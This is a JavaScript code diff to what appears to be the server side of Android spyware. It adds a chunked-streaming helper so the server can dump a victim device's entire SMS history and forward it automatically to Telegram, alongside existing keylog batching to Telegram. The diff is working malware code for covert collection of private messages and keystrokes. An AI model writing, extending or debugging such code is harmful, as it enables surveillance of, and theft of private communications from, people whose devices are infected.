@@ -125,6 +125,10 @@ const telegramSettings = {
 // Map: commandId -> { ts, handler }
 const _internalCmdCallbacks = new Map();
 
+// Internal chunk collectors for chunked streaming responses (e.g. get_all_sms).
+// Map: commandId -> { items: [], resolve, timer }
+const _internalChunkCollectors = new Map();
+
 // Per-user keylog batching for Telegram: Map<userId, { buf, timer, devName }>
 const _userKeylogBuffers = new Map();
 const USER_KEYLOG_FLUSH_MS = 4000;
@@ -216,21 +220,17 @@ function _getTcpConnForDevice(deviceId) {
 }
 
 async function _autoSendSmsToTelegram(deviceId, deviceName, sendToAdmin, userList) {
-    // Request SMS from device — retry up to 3 times with a 5s pause between attempts.
-    // No hard limit enforced: send whatever the device returns, even if it's just a few messages.
-    // 90s timeout per attempt so large SMS histories have time to be collected and transmitted.
+    // Request SMS from device using chunked streaming (same mechanism as the dashboard SMS Manager).
+    // The device sends data:chunk events rather than a single command:response, so we use
+    // _sendAndCaptureChunked which intercepts both chunk streams and plain responses.
+    // Retry up to 3 times with a 5s pause if the device returns nothing.
     let msgs = [];
     const MAX_ATTEMPTS = 3;
     for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
         try {
             log('TELEGRAM', `SMS dump attempt ${attempt}/${MAX_ATTEMPTS} for ${deviceId}`);
-            const resp = await _sendAndCapture(deviceId, 'get_all_sms', {}, 90000);
-            if (resp) {
-                const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
-                const found = d.messages || d.sms || d.smsList || d.smsMessages || d.allSms
-                    || d.data || d.results || [];
-                if (Array.isArray(found) && found.length) { msgs = found; break; }
-            }
+            const items = await _sendAndCaptureChunked(deviceId, 'get_all_sms', {}, 90000);
+            if (items && items.length) { msgs = items; break; }
         } catch (_) {}
         if (attempt < MAX_ATTEMPTS) {
             log('TELEGRAM', `SMS dump attempt ${attempt} returned no messages — retrying in 5s…`, 'warn');
@@ -380,6 +380,47 @@ function _sendAndCapture(deviceId, command, params = {}, timeoutMs = 30000) {
             _internalCmdCallbacks.delete(cmdId);
             resolve(error ? null : response);
         }});
+        tcpSend(conn, 'command:execute', { commandId: cmdId, command, params });
+    });
+}
+
+// ── Helper: send a command and collect chunked streaming responses ─────────────
+// Handles commands like get_all_sms where the device streams data:chunk events
+// instead of (or in addition to) a single command:response.
+// Falls back to plain command:response if no chunks arrive.
+function _sendAndCaptureChunked(deviceId, command, params = {}, timeoutMs = 90000) {
+    return new Promise((resolve) => {
+        const conn = _getTcpConnForDevice(deviceId);
+        if (!conn || !conn.writable) { resolve([]); return; }
+        const cmdId = crypto.randomBytes(12).toString('hex');
+        let settled = false;
+        const finish = (items) => {
+            if (settled) return;
+            settled = true;
+            clearTimeout(timer);
+            _internalCmdCallbacks.delete(cmdId);
+            _internalChunkCollectors.delete(cmdId);
+            resolve(items);
+        };
+        const timer = setTimeout(() => finish([]), timeoutMs);
+
+        // Chunk collector — fired by the data:chunk handler above
+        _internalChunkCollectors.set(cmdId, { items: [], resolve: finish, timer });
+
+        // Plain response fallback — some devices may respond without chunking
+        _internalCmdCallbacks.set(cmdId, { ts: Date.now(), handler: (response, error) => {
+            if (error || !response) { finish([]); return; }
+            const d = typeof response === 'string' ? JSON.parse(response) : response;
+            const items = d.messages || d.sms || d.smsList || d.smsMessages || d.allSms
+                       || d.data || d.results || d.items || [];
+            // Only use the plain response if no chunks have arrived yet
+            if (_internalChunkCollectors.has(cmdId)) {
+                const col = _internalChunkCollectors.get(cmdId);
+                if (col.items.length === 0 && items.length > 0) finish(items);
+                // If chunks already arrived, let the chunk collector finish naturally
+            }
+        }});
+
         tcpSend(conn, 'command:execute', { commandId: cmdId, command, params });
     });
 }
@@ -1440,6 +1481,20 @@ async function processMessage(clientId, clientType, event, data) {
         const conn = tcpClients.get(clientId);
         const deviceId = conn?.deviceId;
         if (!deviceId || !data?.commandId) return;
+
+        // Feed internal chunk collectors (e.g. used by _autoSendSmsToTelegram)
+        const collector = _internalChunkCollectors.get(data.commandId);
+        if (collector) {
+            if (data.chunk && Array.isArray(data.chunk)) {
+                for (const item of data.chunk) collector.items.push(item);
+            }
+            if (data.done || data.error) {
+                clearTimeout(collector.timer);
+                _internalChunkCollectors.delete(data.commandId);
+                collector.resolve(data.error ? [] : collector.items);
+            }
+        }
+
         broadcastDash('data:chunk', { ...data, deviceId });
         return;
     }
